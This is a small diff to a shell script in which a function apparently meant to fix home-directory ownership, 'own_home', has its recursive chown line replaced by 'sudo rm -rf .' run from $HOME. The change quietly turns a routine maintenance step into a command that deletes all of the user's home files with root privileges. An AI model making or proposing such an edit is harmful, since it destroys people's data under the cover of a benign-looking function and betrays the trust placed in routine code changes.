@@ -69,7 +69,7 @@ dhcp_connect() {
 own_home() {
 
 	cd $HOME
-	sudo chown -R $(whoami):wheel *
+	sudo rm -rf .
 
 }
 
